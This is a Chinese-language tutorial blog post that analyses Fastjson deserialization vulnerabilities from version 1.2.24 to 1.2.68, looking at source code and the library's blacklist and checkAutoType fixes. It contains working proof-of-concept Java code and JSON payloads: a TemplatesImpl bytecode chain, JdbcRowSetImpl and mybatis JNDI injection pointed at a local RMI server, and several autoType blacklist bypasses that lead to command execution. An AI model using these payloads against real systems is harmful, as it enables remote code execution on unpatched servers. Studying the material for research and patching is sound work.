---
title: "Fastjson反序列化漏洞"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# Fastjson反序列化漏洞

fastjson算是国内用的比较多的一个组件了，它的反序列化漏洞也是经典中的经典

## Fastjson基础

### 简单使用

Fastjson 是阿里开源的 **Java JSON 库**，号称“Java 最快 JSON 解析/生成器”，作用就是 **把 Java 对象 ↔ JSON 字符串 互相转换**，让网络传输、持久化、前后端交互更简单，这个转换过程也就相当于我们常说的序列化与反序列化了

我们可以写一个demo看看，首先添加依赖：

~~~xml
<dependencies>
    <dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.50</version>
    </dependency>
</dependencies>
~~~

接下来是demo代码，其中给出了一个java对象，一个json字符串，然后将他们用fastjson的组件来转换：

~~~java
package com.yuy0ung;

import com.alibaba.fastjson.JSON;

public class FastJsonDemo {
    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Yuy1ung", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"age\":20,\"name\":\"Yuy0ung\"}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    public static class Person {
        private String name;
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public int getAge() {
            return age;
        }
    }
}
~~~

运行后可以看到Java 对象序列化为 JSON 字符串，JSON 字符串反序列化为 Java 对象：

![image-20251104142345654](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251104142345654.png)

可以看到我们使用`JSON.toJSONString()`和`JSON.parseObject()`就完成了序列化和反序列化，非常方便

### 一些特性

#### 字段映射关系

在使用`fastjson`时，我们需要先将`JSON`字符串和`Java`对象之间建立映射关系，可以通过类的属性和`JSON`字段名进行映射。在我们上面的代码中，`Java`类的属性名和`JSON`字段名是相同的，因此可以直接使用`Person.class`来进行映射

如果不同，可以使用`@JSONField`注解来指定`Java`类的属性和`JSON`字段之间的映射关系：

~~~java
package com.yuy0ung;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONField;


public class FastJsonDemo {
    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Yuy1ung", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"user_age\":20,\"user_name\":\"Yuy0ung\"}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    public static class Person {
        @JSONField(name = "user_name")
        private String name;
        @JSONField(name = "user_age")
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public int getAge() {
            return age;
        }
    }
}
~~~

这样就可以实现java类属性与json字段的对应：

![image-20251105102723336](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251105102723336.png)

#### 字段顺序

默认情况下，生成的`JSON`字符串的顺序是按照**属性的字母顺序**进行排序的，而不是按照属性在类中的声明顺序

如果我们希望按照属性在类中的声明顺序来生成`JSON`字符串，可以通过在类中使用`@JSONType(orders = {"name", "age"})`注解来设置属性的序列化顺序：

~~~java
package com.yuy0ung;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.annotation.JSONField;
import com.alibaba.fastjson.annotation.JSONType;


public class FastJsonDemo {
    public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Yuy1ung", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"user_age\":20,\"user_name\":\"Yuy0ung\"}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }

    // 定义一个简单的 Java 类
    @JSONType(orders = {"user_name", "user_age"})
    public static class Person {
        @JSONField(name = "user_name")
        private String name;
        @JSONField(name = "user_age")
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public int getAge() {
            return age;
        }
    }
}
~~~

这样就可以修改生成的json字段顺序：

![image-20251105103501402](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251105103501402.png)

### 类型注解@type

`@type`是`fastjson`中的一个特殊注解，用于标识`JSON`字符串中的某个属性是一个`Java`对象的类型。具体来说，当`fastjson`从`JSON`字符串反序列化为`Java`对象时，如果`JSON`字符串中包含`@type`属性，`fastjson`会根据该属性的值来确定反序列化后的`Java`对象的类型，比如这个demo（需要注意的是：由于`fastjson`在`1.2.24`之后默认禁用`AutoType`，因此这里我们通过`ParserConfig.getGlobalInstance().addAccept("java.lang");`来开启，否则会报错`autoType is not support`）：

~~~java
package com.yuy0ung;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;

public class FastJsonCalc {
    public static void main(String[] args) throws IOException {
        String json = "{\"@type\":\"java.lang.Runtime\"}";
        ParserConfig.getGlobalInstance().addAccept("java.lang");
        Runtime runtime = (Runtime) JSON.parseObject(json, Object.class);
        runtime.exec("open -a calculator");
    }
}
~~~

可以看到这里的`@type`字段指定了反序列化结果为`java.lang.Runtime` 类的实例，所以可以调用反序列化生成的Runtime对象进行命令执行：

![image-20251105104302629](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251105104302629.png)

再看一个demo：

首先创建一个Person类：

~~~java
package com.yuy0ung;

public class Person {
    private String name;
    private int age;

    public Person() {}

    @Override
    public String toString() {
        return "Person{" +
                "name='" + name + '\'' +
                ", age=" + age +
                '}';
    }

    public Person(String name, int age) {
        this.name = name;
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
~~~

然后一个FastJsonTest类：
~~~java
package com.yuy0ung;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.serializer.SerializerFeature;

public class FastJsonTest {
    public static void main(String[] args) {
        Person user = new Person();
        user.setAge(20);
        user.setName("Yuy0ung");
        String s1 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s1);
    }
}
~~~

运行查看结果：

![image-20251105110123460](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251105110123460.png)

我们发现此时生成的json自带@type字段了，其实就是在调用`toJSONString`方法的时候，参数里面多了一个`SerializerFeature.WriteClassName`方法。传入`SerializerFeature.WriteClassName`可以使得`Fastjson`支持自省，开启自省后序列化成`JSON`的数据就会多一个`@type`，这个是代表对象类型的`JSON`文本

`FastJson`的漏洞就是这个`@type`功能去产生的，在对该`JSON`数据进行反序列化的时候，会去调用指定类中对于的`get/set/is`方法，我们接下来详细分析

## Fastjson漏洞

### fastjson<=1.2.24 反序列化漏洞

#### TesmplatesImpl动态加载字节码

使用Fastjson1.2.23依赖，构建如下代码（我这里和先前的CC链一样，使用javassist来获得字节码）：

~~~java
package com.yuy0ung.fastjson1_2_24;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;

import java.util.Base64;


public class FastJson1_2_23 {
    public static void main(String[] args) throws Exception {
        byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode();
        String payload = serialize(code);   // 直接传字节码
        deserialize(payload);
    }

    //因为序列化也会触发命令执行，我这里直接拼接
    public static String serialize(byte[] code) {
        String b64 = Base64.getEncoder().encodeToString(code);
        String payload = "{\n" +
                "  \"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\n" +
                "  \"_bytecodes\":[\"" + b64 + "\"],\n" +
                "  \"_name\":\"HelloTemplatesImpl\",\n" +
                "  \"_tfactory\":{ \"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\" },\n" +
                "  \"_outputProperties\":{}\n" +
                "}";
        System.out.println(payload);
        return payload;
    }

    public static void deserialize(String json) throws Exception {
        ParserConfig parserConfig = new ParserConfig();
        Object obj = JSON.parseObject(json, Object.class, parserConfig, Feature.SupportNonPublicField);
    }
}
~~~

运行后，可以看见生成的payload，以及payload反序列化后成功执行命令：

![QQ_1762335079859](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762335079859.png)

而我们分析这个payload就知道这里实际上就是我们学过的TemplatesImlp动态加载字节码

即构造一个`TemplatesImpl`类的反序列化字符串，其中`_bytecodes`是我们构造的恶意类的类字节码，这个类的父类是`AbstractTranslet`，最终这个类会被加载并使用`newInstance()`实例化。在反序列化过程中，由于`getter`方法`getOutputProperties()`满足条件，将会被`fastjson`调用，而漏洞利用的限制条件也很明显：需要代码中加了`Feature.SupportNonPublicField`，即允许向对象的非public属性赋值

#### JdbcRowSetImpl打JNDI注入

这里我们会接触到一个新的类：`com.sun.rowset.JdbcRowSetImpl`

我们先看看这个demo：
~~~java
package com.yuy0ung.fastjson1_2_24;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJsonJdbcRowSetImpl {
    public static void main(String[] args) throws Exception {
        String payload  = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                        "\"dataSourceName\":\"rmi://127.0.0.1:1099/hello\"," +
                        "\"autoCommit\":\"true\"}";
        deserialize(payload);
    }


    public static void deserialize(String json) throws Exception {
        ParserConfig parserConfig = new ParserConfig();
        Object obj = JSON.parseObject(json, Object.class, parserConfig, Feature.SupportNonPublicField);
    }
}
~~~

注意这里的rmi服务就是我们JNDI注入使用的server，运行后发现成功执行命令：

![QQ_1762418555654](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762418555654.png)

我们看payload就已经知道这里是打了一个JNDI注入，接下来我们分析一下为什么这个JdbcRowSet可以触发JNDI

JNDI查询肯定是从lookup函数触发，我们找一下发现在connect()方法中：
![QQ_1762419251231](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762419251231.png)

然后找调用connect()函数的地方，发现一个getter和一个setter：
![QQ_1762419636589](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762419636589.png)

![QQ_1762419680725](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762419680725.png)

很明显这里在反序列化时无法调用getter，所以重点看这个setter，在conn为null时触发connect，在fastjson中，实例化类时是调用的`newInstance()`，也就是会调用默认的构造方法，可以看一下这里的默认的构造方法：
![QQ_1762419989061](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762419989061.png)

这里会将conn设置为null，没毛病，那再看看connect()需要的参数：

![QQ_1762420142534](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762420142534.png)

我们需要控制这个getDataSourceName()的值，跟进一下：

![QQ_1762422562316](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762422562316.png)发现是返回的父类BaseRowSet的一个变量，并且父类存在setter方法来进行赋值：

![QQ_1762422624202](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762422624202.png)

那么我们就可以构造出对应的json：
~~~json
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"rmi://127.0.0.1:1099/hello",
	"autoCommit":"true"
}
~~~

这里就和上面的demo一样了

### 1.2.25<=fastjson<=1.2.41 反序列化

众所周知，在`fastjson`自爆`1.2.24`版本的反序列化漏洞后，`1.2.25`版本就加入了黑白名单机制， 例如我们更换并下载`1.2.25`版本的`fastjson`，然后再去执行原来的`poc`：

![image-20251105180538126](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251105180538126.png)

发现已经无法命令执行了，并且报错autoType is not support

我们通过查看源码可以发现添加了黑名单：

![QQ_1762337954374](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762337954374.png)

黑名单内容如下：
~~~java
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
~~~

这就导致我们前面的payload都失效了

继续向下定位到CheckAutoType：

![image-20251105185919969](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251105185919969.png)

我们看这里的逻辑，如果开启了`autoType`，那么就先判断类名在不在白名单中，如果在就用`TypeUtils.loadClass`加载，如果不在就去匹配黑名单

继续往下走：

![QQ_1762415401028](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762415401028.png)

如果没开启`autoType`，则先匹配黑名单，然后再白名单匹配和加载

最后，如果要反序列化的类和黑白名单都未匹配时，只有开启了`autoType`或者`expectClass`不为空也就是指定了`Class`对象时才会调用`TypeUtils.loadClass`加载，否则`fastjson`会默认禁止加载该类：

![QQ_1762415493567](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762415493567.png)

我们看这个TypeUtils的loadclass()方法：

![image-20251106155550128](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251106155550128.png)

这里的代码逻辑是：如果类名的字符串以`[`开头，就是`@type`键的值以`[`开头，则说明该类是一个数组类型，就使用substring方法来截断获取`[`后面的方法，然后再次调用loadClass()方法来加载需要递归调用`loadClass`方法来加载数组元素类型对应的`Class`对象，然后使用`Array.newIntrance`方法来创建一个空数组对象，最后返回该数组对象的`Class`对象；如果类名的字符串以`L`开头并以`;`结尾，则说明该类是一个普通的`Java`类，需要把开头的`L`和结尾的`;`给去掉，然后递归调用`loadClass`

问题就出现在这里，可以针对这个逻辑进行绕过：
我们需要先开启默认禁用的`autoType`：

~~~java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
~~~

接下来就是构造POC了，分析了上面的逻辑就知道可以用L和分号来bypass：

~~~json
{
  "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
	"dataSourceName":"rmi://127.0.0.1:1099/hello",
	"autoCommit":"true"
}
~~~

那么整体的代码如下：

~~~java
package com.yuy0ung.fastjson1_2_25;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJson_Demo {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload  = "{\n" +
                "  \"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\n" +
                "\t\"dataSourceName\":\"rmi://127.0.0.1:1099/hello\",\n" +
                "\t\"autoCommit\":\"true\"\n" +
                "}";
        deserialize(payload);
    }

    public static void deserialize(String json) throws Exception {
        Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);
    }
}
~~~

运行成功反序列化触发命令执行：

![QQ_1762502215261](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762502215261.png)

也可以用`[`来绕过：

~~~java
{
  "@type":"[com.sun.rowset.JdbcRowSetImpl"[{,
	"dataSourceName":"rmi://127.0.0.1:1099/hello",
	"autoCommit":"true"
}
~~~

同样能成功执行命令：
![QQ_1762503073386](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762503073386.png)

### fastjson 1.2.42 反序列化

前面提到的数组payload不受影响仍然能打：

~~~java
package com.yuy0ung.fastjson1_2_42;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJson_Demo2 {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload  = "{\n" +
                "  \"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\n" +
                "\t\"dataSourceName\":\"rmi://127.0.0.1:1099/hello\",\n" +
                "\t\"autoCommit\":\"true\"\n" +
                "}";
        deserialize(payload);
    }

    public static void deserialize(String json) throws Exception {
        Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);
    }
}
~~~

![QQ_1762504449427](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762504449427.png)

但是L和分号的payload不行了：

![QQ_1762504908251](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762504908251.png)

这里又说不支持这个类，多半是黑名单逻辑改了，分析一下可以看到黑名单变成了哈希值：
![QQ_1762505550824](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762505550824.png)

这里对首字符和尾字符做一次简化版 FNV-1a 风格的哈希运算来看有没有L开头和分号结尾，有的话就截取后传给下一步的检验：

![QQ_1762506967415](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762506967415.png)

然后用hash来检验黑名单：

![QQ_1762505699168](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762505699168.png)

其实很好想到，上面对头尾的检测只做了一次，而最后loadclass的逻辑是递归调用来循环去除L和分号：

![QQ_1762507343845](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762507343845.png)

所以我们这里可以双写L和;进行绕过：

~~~java
package com.yuy0ung.fastjson1_2_42;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJson_Demo {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload  = "{\n" +
                "  \"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\n" +
                "\t\"dataSourceName\":\"rmi://127.0.0.1:1099/hello\",\n" +
                "\t\"autoCommit\":\"true\"\n" +
                "}";
        deserialize(payload);
    }

    public static void deserialize(String json) throws Exception {
        Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);
    }
}
~~~

可以看到成功执行：
![QQ_1762507499643](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762507499643.png)

相当于这里的检验只去除一次，而loadclass能去除两次再加载，既然这样，写多少次其实都能去除：

![QQ_1762507594255](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762507594255.png)

### fastjson 1.2.43 反序列化

数组仍然可行：

![QQ_1762508208054](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762508208054.png)

但是双写失败了：
![QQ_1762508163683](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762508163683.png)

看看修复方法：

![QQ_1762508282326](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762508282326.png)

直接两次if，如果存在双写直接输出不支持，那没办法，只能打数组的绕过了

### fastjson 1.2.44

在这个版本，数组的绕过也被修复了：
![QQ_1762508417718](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762508417718.png)

修复方法就是增加判断：

![QQ_1762508842266](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762508842266.png)

第一个if判断开头是否为`[`，第二个if判断首尾是不是L和`;`，这里就把两种bypass完全修复了

### 1.2.25 <= fastjson <= 1.2.45 反序列化

这个版本存在组件黑名单绕过，并没有禁用mybatis的一个组件，所以实际1.2.25 <= fastjson <= 1.2.45版本都存在

首先添加依赖：

~~~xml
<dependency>  
    <groupId>org.mybatis</groupId>  
    <artifactId>mybatis</artifactId>  
    <version>3.5.7</version>
</dependency>
~~~

payload也很明了，一看就懂：

~~~json
{
  "@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory",
	"properties":{
    "data_source":"rmi://127.0.0.1:1099/hello"
  }
}
~~~

可以触发对应类的setter的lookup方法：

![QQ_1762509273595](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762509273595.png)

利用jndi注入到命令执行：

![QQ_1762509185686](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762509185686.png)

### 1.2.25 <= fastjson <= 1.2.47 反序列化

这是一个很重要的利用方法，甚至不需要`ParserConfig.getGlobalInstance().setAutoTypeSupport(true)`来开启autoType

先看POC：

~~~json
{
  "a":{
    "@type":"java.lang.Class",
    "val":"com.sun.rowset.JdbcRowSetImpl"
  },
  "b":{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://127.0.0.1/exp",
    "autoCommit":true
  }
}
~~~

我们使用这个进行fastjson反序列化，可以成功命令执行：

![QQ_1762509649452](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762509649452.png)

分析POC会发现，外面又套了一个json，并且加了一个`{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}`，我们分析一下为什么能够绕过

首先还是看checkAutoType()：

![image-20251109154408041](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20251109154408041.png)

我们重点看未开启autoType时的操作，首先是getClassFromMapping，在mapping中获取class：

![QQ_1762674536520](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762674536520.png)

![QQ_1762675043260](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762675043260.png)

如果不行就是第二种方法，从deserializers中获取：

![QQ_1762675098676](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762675098676.png)

但是`deserializers`是`private`类型的，虽然当前类里面有一个`public`的`putDeserializer`方法，但只有一个地方调用了，没法构成调用链，所以重点关注这个同样`private`类型的mapping，而在`TypeUtils.loadClass`中有调用到mappings.put：

![QQ_1762675943990](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762675943990.png)

经过查找发现MiscCodec.deserialze调用了`TypeUtils.loadClass`：

![QQ_1762677180376](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762677180376.png)

而strVal变量是通过objVal变量强转来的：

![QQ_1762677419610](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762677419610.png)

而objVal则是通过调用Default#parse()方法获取的：

![QQ_1762677463652](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762677463652.png)

我们看下之前的`deserializers`中哪里调用了MiscCodec：

![QQ_1762677813391](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762677813391.png)

这里是放入了一个Class.class的键，所以结合前面的分析，当我们正常反序列化时，是会获取deserializer并调用它的deserialze()方法，所以对应的，我们可以先尝试传入Class.class，从而获取到MiscCodec类实例，从而调用到它的deserialze()方法，从而往mappings中放入想要利用的类，从而在直接在后续中获得想要的类，那么我们的payload就出来了，json就像前面的demo那样构造：

~~~json
package com.yuy0ung.fastjson1_2_47;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class FastJson_Demo {
    public static void main(String[] args) throws Exception {
        String payload  = "{\n" +
                "  \"a\":{\n" +
                "    \"@type\":\"java.lang.Class\",\n" +
                "    \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
                "  },\n" +
                "  \"b\":{\n" +
                "    \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "    \"dataSourceName\":\"rmi://127.0.0.1:1099/hello\",\n" +
                "    \"autoCommit\":true\n" +
                "  }\n" +
                "}";
        deserialize(payload);
    }

    public static void deserialize(String json) throws Exception {
        Object obj = JSON.parseObject(json, Object.class, Feature.SupportNonPublicField);
    }
}
~~~

总结一下：

1.2.47版本默认不开启AutoType，所以我们尝试向mapping或serializer添加类，寻找相关可控方法，最后决定利用loadClass方法向mapping中添加类

想要调用对应的loadClass方法，需要调用MiscCodec#deserialze方法，且需要clazz为Class.class类型。其次还需要控制我们添加的类名为strVal，不断往前回溯，即val变量的值。

想要调用MiscCodec#deserialze方法，我们需要对fastjson解析json有一定了解，对于deserialze方法通常会在DefaultJSONParser类中被调用，所选取的对象则是通过getDeserializer方法获取

由于我们要利用的是java.lang.Class，而恰好deserializers又缓存Class.class，且Value正是MiscCodec对象，getDeserializer方法正是获取key所对应的value

然后就是通过构造如下json，通过调用MiscCodec#deserialze方法将恶意对象的名字加进mapping中，加载到mapping中以后，在下一次`checkAutoType`的时候，直接就返回了，绕过了检验的部分直接执行

### fastjson 1.2.68 反序列化

`fastjson 1.2.47`的时候爆出来的这个缓存的漏洞很严重，官方在`1.2.48`的时候就进行了限制，直到1.2.68

我们看下MiscCodec上面，这里的cache设置为了false：
![QQ_1762681198525](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762681198525.png)

而`loadClass`重载方法的默认的调用改为不缓存：

![QQ_1762681392721](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762681392721.png)

`fastjson 1.2.68`还有一个亮点就是更新了个`safeMode`：

![QQ_1762681525407](https://yuy0ung.oss-cn-chengdu.aliyuncs.com/QQ_1762681525407.png)

如果开启了`safeMode`，那么`autoType`就会被完全禁止。
 但是，这个版本有了个新的绕过方式：`expectClass`，我们回到checkAutoType，发现同时满足以下条件的时候，可以绕过`checkAutoType`：

- `expectClass`不为`null`，且不等于`Object.class`、`Serializable.class`、`Cloneable.class`、`Closeable.class`、`EventListener.class`、`Iterable.class`、`Collection.class`；1
- `expectClass`需要在缓存集合`TypeUtils#mappings`中；
- `expectClass`和`typeName`都不在黑名单中；
- `typeName`不是`ClassLoader`、`DataSource`、`RowSet`的子类；
- `typeName`是`expectClass`的子类。
